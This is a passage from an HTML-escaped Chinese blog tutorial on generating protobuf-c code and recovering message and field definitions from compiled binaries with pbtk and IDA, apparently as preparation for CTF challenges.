1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;安装：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt-get update&#xD;&#xA;sudo apt-get install -y protobuf-compiler libprotobuf-dev&#xD;&#xA;sudo apt-get install libprotobuf-c-dev protobuf-c-compiler&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;protoc-c &amp;ndash;version用这句来验证是否安装完成&lt;/p&gt;&#xA;&lt;p&gt;创建一个文件&lt;code&gt;user.proto&lt;/code&gt;，写入：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;syntax = &amp;#34;proto3&amp;#34;;&#xD;&#xA;&#xD;&#xA;message User {&#xD;&#xA;  int32 id = 1;&#xD;&#xA;  string name = 2;&#xD;&#xA;  string email = 3;&#xD;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用以下命令生成C代码：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protoc --c_out=. ./user.proto&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这会在当前目录下生成两个文件：&lt;code&gt;user.pb-c.h&lt;/code&gt;和&lt;code&gt;user.pb-c.c&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;user.pb-c.h&lt;/code&gt;&lt;/strong&gt;：头文件，定义了消息类型（如&lt;code&gt;User&lt;/code&gt;结构体）及其相关的函数。&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;user.pb-c.c&lt;/code&gt;&lt;/strong&gt;：源文件，实现了这些函数，包含序列化和反序列化等操作。&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$ tree .          &#xD;&#xA;.&#xD;&#xA;├── user.pb-c.c&#xD;&#xA;├── user.pb-c.h&#xD;&#xA;└── user.proto&#xD;&#xA;&#xD;&#xA;0 directories, 3 files&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在C程序中，需要包含生成的&lt;code&gt;user.pb-c.h&lt;/code&gt;头文件，这样就可以使用&lt;code&gt;User&lt;/code&gt;消息类型及其相关的protobuf操作函数。&lt;/p&gt;&#xA;&lt;p&gt;打个比方&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;//pwn.c&#xD;&#xA;#include &amp;lt;stdio.h&amp;gt;&#xD;&#xA;#include &amp;lt;stdlib.h&amp;gt;&#xD;&#xA;#include &amp;#34;user.pb-c.h&amp;#34;  // 包含生成的头文件&#xD;&#xA;&#xD;&#xA;int main() {&#xD;&#xA;    // 创建一个 User 对象，并初始化&#xD;&#xA;    User user = USER__INIT;  // 生成的宏用于初始化User结构体&#xD;&#xA;    user.id = 123;  // 设置用户ID&#xD;&#xA;    user.name = &amp;#34;John Doe&amp;#34;;  // 设置用户名&#xD;&#xA;    user.email = &amp;#34;john.doe@example.com&amp;#34;;  // 设置用户邮箱&#xD;&#xA;&#xD;&#xA;    // 序列化消息&#xD;&#xA;    size_t serialized_size = user__get_packed_size(&amp;amp;user);  // 获取序列化消息所需的大小&#xD;&#xA;    void *buffer = malloc(serialized_size);  // 分配内存存放序列化数据&#xD;&#xA;    user__pack(&amp;amp;user, buffer);  // 序列化数据到buffer&#xD;&#xA;&#xD;&#xA;    printf(&amp;#34;Serialized User data to %zu bytes\n&amp;#34;, serialized_size);&#xD;&#xA;&#xD;&#xA;    // 反序列化消息&#xD;&#xA;    User *new_user = user__unpack(NULL, serialized_size, buffer);  // 从二进制数据反序列化为User对象&#xD;&#xA;    if (new_user == NULL) {&#xD;&#xA;        fprintf(stderr, &amp;#34;Error unpacking User message\n&amp;#34;);&#xD;&#xA;        return 1;&#xD;&#xA;    }&#xD;&#xA;&#xD;&#xA;    // 输出解包后的User数据&#xD;&#xA;    printf(&amp;#34;ID: %d\n&amp;#34;, new_user-&amp;gt;id);&#xD;&#xA;    printf(&amp;#34;Name: %s\n&amp;#34;, new_user-&amp;gt;name);&#xD;&#xA;    printf(&amp;#34;Email: %s\n&amp;#34;, new_user-&amp;gt;email);&#xD;&#xA;&#xD;&#xA;    // 清理内存&#xD;&#xA;    user__free_unpacked(new_user, NULL);  // 释放反序列化后的对象&#xD;&#xA;    free(buffer);  // 释放序列化的缓冲区内存&#xD;&#xA;&#xD;&#xA;    return 0;&#xD;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后对其进行编译&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;gcc -o pwn user.pb-c.c pwn.c -lprotobuf-c&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在这个命令中：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;user.pb-c.c&lt;/code&gt; 是由 &lt;code&gt;protoc&lt;/code&gt; 生成的 C 源文件。&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;your_program.c&lt;/code&gt; 是编写的包含主程序的 C 文件。&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;-lprotobuf-c&lt;/code&gt; 指定链接 Protobuf-C 库。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;然后就可以看到，我们生成了一个pwn文件&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;基础知识&#34;&gt;&lt;span&gt;基础知识&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Proto2&lt;/strong&gt;: 支持 &lt;code&gt;required&lt;/code&gt; 和 &lt;code&gt;optional&lt;/code&gt; 修饰符。&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Proto3&lt;/strong&gt;: 默认所有字段为 &lt;code&gt;optional&lt;/code&gt;，不支持 &lt;code&gt;required&lt;/code&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;工具逆向&#34;&gt;&lt;span&gt;工具逆向&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%b7%a5%e5%85%b7%e9%80%86%e5%90%91&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/marin-m/pbtk&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;pbtk&lt;/a&gt;逆向protobuf的工具&lt;/p&gt;&#xA;&lt;p&gt;安装&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt install python3-pip git openjdk-11-jre libqt5x11extras5 python3-pyqt5.qtwebengine python3-pyqt5&#xD;&#xA;sudo pip3 install protobuf pyqt5 pyqtwebengine requests websocket-client&#xD;&#xA;git clone https://github.com/marin-m/pbtk&#xD;&#xA;cd pbtk&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;# 从二进制文件中提取 .proto 定义&#xD;&#xA;./extractors/from_binary.py /path/to/binary&#xD;&#xA;# 从 JAR/APK 提取&#xD;&#xA;./extractors/jar_extract.py /path/to/app.apk&#xD;&#xA;# 从网页提取 JsProtoUrl&#xD;&#xA;./extractors/web_extract.py https://example.com/proto-endpoint&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;也可以创建软链接使用，注意这里要用绝对路径&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo ln -s /home/ctf/pbtk/extractors/from_binary.py /usr/local/bin/from_binary&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后就可以直接这样使用：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from_binary ./pwn&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$ strings ./pwn | grep -i &amp;#34;\.proto&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果没有就用不了&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;手动逆向&#34;&gt;&lt;span&gt;手动逆向&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%89%8b%e5%8a%a8%e9%80%86%e5%90%91&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;message&#34;&gt;&lt;span&gt;message&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#message&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;syntax = &amp;#34;proto2&amp;#34;;&#xD;&#xA; message Message_request{&#xD;&#xA; required int32 id = 1;&#xD;&#xA; required string sender = 2;&#xD;&#xA; required uint32 len = 3;&#xD;&#xA; required bytes content = 4;&#xD;&#xA; required int32 actionid = 5;&#xD;&#xA; }&#xD;&#xA; message Message_response{&#xD;&#xA; required int32 id = 1;&#xD;&#xA; required string receiver = 2;&#xD;&#xA; required int32 status_code = 3;&#xD;&#xA; optional string error_message = 4;&#xD;&#xA; }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果定义了两个&lt;code&gt;message&lt;/code&gt;，我们去IDA中查看字符串，搜索&lt;code&gt;message&lt;/code&gt;就会发现：&lt;/p&gt;&#xA;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/img/protobuf/message.png&#34; title=&#34;/img/protobuf/message.png&#34; data-thumbnail=&#34;/img/protobuf/message.png&#34; data-sub-html=&#34;&lt;h2&gt;/img/protobuf/message.png&lt;/h2&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/img/protobuf/message.png&#39; alt=&#34;/img/protobuf/message.png&#34;&gt;&lt;/a&gt;&#xA;&lt;p&gt;这里会出现&lt;code&gt;message&lt;/code&gt;的名字，并知道定义了几个&lt;code&gt;message&lt;/code&gt;&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;成员&#34;&gt;&lt;span&gt;成员&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%88%90%e5%91%98&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;一般从&lt;code&gt;rodata&lt;/code&gt;从上往下看，看到的第一个一般都是&lt;code&gt;string&lt;/code&gt;中的第一个，这里的第一个就是&lt;code&gt;message_request&lt;/code&gt;。在IDA里：&lt;/p&gt;&#xA;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/img/protobuf/member1.png&#34; title=&#34;/img/protobuf/member1.png&#34; data-thumbnail=&#34;/img/protobuf/member1.png&#34; data-sub-html=&#34;&lt;h2&gt;/img/protobuf/member1.png&lt;/h2&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/img/protobuf/member1.png&#39; alt=&#34;/img/protobuf/member1.png&#34;&gt;&lt;/a&gt;&#xA;&lt;p&gt;往下找还能找到另一个&lt;code&gt;message&lt;/code&gt;的成员：&lt;/p&gt;&#xA;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/img/protobuf/member2.png&#34; title=&#34;/img/protobuf/member2.png&#34; data-thumbnail=&#34;/img/protobuf/member2.png&#34; data-sub-html=&#34;&lt;h2&gt;/img/protobuf/member2.png&lt;/h2&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/img/protobuf/member2.png&#39; alt=&#34;/img/protobuf/member2.png&#34;&gt;&lt;/a&gt;&#xA;&lt;p&gt;因为上面有id了，这里的id就不会显示&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;更准确的查看成员的话&lt;/strong&gt;，可以点击旁边的&lt;code&gt;; DATA XREF: .data.rel.ro:0000000000003CD0↓o&lt;/code&gt;，就能查看引用&lt;/p&gt;&#xA;&lt;p&gt;这会跳到&lt;code&gt;.data.rel.ro&lt;/code&gt;段，跳到的这里，一片地址都是同一个&lt;code&gt;message的成员&lt;/code&gt;&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;字段描述符&#34;&gt;&lt;span&gt;字段描述符&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%ad%97%e6%ae%b5%e6%8f%8f%e8%bf%b0%e7%ac%a6&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;了解完有哪些&lt;code&gt;message&lt;/code&gt;，每个&lt;code&gt;message&lt;/code&gt;有哪些成员，接下来就是每个成员的类型&lt;/p&gt;&#xA;&lt;p&gt;这就要到&lt;code&gt;.data.rel.ro&lt;/code&gt;去看了&lt;/p&gt;&#xA;&lt;p&gt;proto文件：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;syntax = &amp;#34;proto2&amp;#34;;&#xD;&#xA;&#xD;&#xA;message User {&#xD;&#xA;  required int32 id = 1;&#xD;&#xA;  required string name = 2;&#xD;&#xA;  optional string email = 3;&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;message User2 {&#xD;&#xA;  required int32 id_2 = 1;&#xD;&#xA;  required string name = 2;&#xD;&#xA;  optional string email_2 = 3;&#xD;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;用IDA打开&lt;/p&gt;&#xA;&lt;p&gt;这里取&lt;code&gt;User&lt;/code&gt;的&lt;code&gt;name&lt;/code&gt;成员来分析&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;.data.rel.ro:0000000000003A68                 dq offset aName         ; &amp;#34;name&amp;#34;&#xD;&#xA;.data.rel.ro:0000000000003A70                 db    2&#xD;&#xA;.data.rel.ro:0000000000003A71                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A72                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A73                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A74                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A75                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A76                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A77                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A78                 db  0Eh&#xD;&#xA;.data.rel.ro:0000000000003A79                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A7A                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A7B                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A7C                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A7D                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A7E                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A7F                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A80                 db  20h&#xD;&#xA;.data.rel.ro:0000000000003A81                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A82                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A83                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A84                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A85                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A86                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A87                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A88                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A89                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A8A                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A8B                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A8C                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A8D                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A8E                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A8F                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A90                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A91                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A92                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A93                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A94                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A95                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A96                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A97                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A98                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A99                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A9A                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A9B                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A9C                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A9D                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A9E                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A9F                 db    0&#xD;&#xA;.data.rel.ro:0000000000003AA0                 db    0&#xD;&#xA;.data.rel.ro:0000000000003AA1                 db    0&#xD;&#xA;.data.rel.ro:0000000000003AA2                 db    0&#xD;&#xA;.data.rel.ro:0000000000003AA3                 db    0&#xD;&#xA;.data.rel.ro:0000000000003AA4                 db    0&#xD;&#xA;.data.rel.ro:0000000000003AA5                 db    0&#xD;&#xA;.data.rel.ro:0000000000003AA6                 db    0&#xD;&#xA;.data.rel.ro:0000000000003AA7                 db    0&#xD;&#xA;.data.rel.ro:0000000000003AA8                 db    0&#xD;&#xA;.data.rel.ro:0000000000003AA9                 db    0&#xD;&#xA;.data.rel.ro:0000000000003AAA                 db    0&#xD;&#xA;.data.rel.ro:0000000000003AAB                 db    0&#xD;&#xA;.data.rel.ro:0000000000003AAC                 db    0&#xD;&#xA;.data.rel.ro:0000000000003AAD                 db    0&#xD;&#xA;.data.rel.ro:0000000000003AAE                 db    0&#xD;&#xA;.data.rel.ro:0000000000003AAF                 db    0&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里其实就是对应这个结构体（&lt;code&gt;proto3&lt;/code&gt;去掉了&lt;code&gt;default_value&lt;/code&gt;字段）：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;struct ProtobufCFieldDescriptor {&#xD;&#xA;    const char *name;            // 0x00 - 指向字段名的字符串&#xD;&#xA;    unsigned int id;             // 0x08 - 字段编号&#xD;&#xA;    unsigned int label;          // 0x0C - required/optional/repeated&#xD;&#xA;    unsigned int type;           // 0x10 - protobuf 类型 (int32=1, string=14 等)&#xD;&#xA;    unsigned int quantifier_offset; // 0x14 - has_xxx 或 array length 偏移&#xD;&#xA;    unsigned int offset;         // 0x18 - 在 message struct 里的偏移&#xD;&#xA;    unsigned int _pad0;          // 0x1C - 对齐&#xD;&#xA;    const void *descriptor;      // 0x20 - 嵌套 message/enum 描述符&#xD;&#xA;    const void *default_value;   // 0x28 - 默认值&#xD;&#xA;    unsigned int flags;          // 0x30&#xD;&#xA;    unsigned int reserved;       // 0x34&#xD;&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;导入IDA的话：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;typedef void (__fastcall *ProtobufCMessageInit)(void *msg);&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;struct ProtobufCIntRange {&#xD;&#xA;    int start_value;&#xD;&#xA;    int orig_index;&#xD;&#xA;};&#xD;&#xA;&#xD;&#xA;struct ProtobufCFieldDescriptor {&#xD;&#xA;    unsigned int id;&#xD;&#xA;    unsigned int label;&#xD;&#xA;    unsigned int type;&#xD;&#xA;    unsigned int quantifier_offset;&#xD;&#xA;    unsigned int offset;&#xD;&#xA;    void *descriptor;&#xD;&#xA;    void *default_value;&#xD;&#xA;    unsigned int flags;&#xD;&#xA;    unsigned long reserved1;&#xD;&#xA;    unsigned long reserved2;&#xD;&#xA;    unsigned long reserved3;&#xD;&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;name：字段名。&lt;/li&gt;&#xA;&lt;li&gt;id：唯一字段编号。&lt;/li&gt;&#xA;&lt;li&gt;label：修饰符，如：required、optional、repeated。&lt;/li&gt;&#xA;&lt;li&gt;type：数据类型，如：bool、int32、float、double等。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h5 class=&#34;heading-element&#34; id=&#34;id&#34;&gt;&lt;span&gt;&lt;strong&gt;id&lt;/strong&gt;&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#id&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;.data.rel.ro:0000000000003A70                 db    2&#xD;&#xA;.data.rel.ro:0000000000003A71                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A72                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A73                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A74                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A75                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A76                 db    0&#xD;&#xA;.data.rel.ro:0000000000003A77                 db    0&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里的&lt;code&gt;2&lt;/code&gt;就是：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;  required string name = 2;&lt;/code&gt;&lt;/pre&gt;&lt;h5 class=&#34;heading-element&#34; 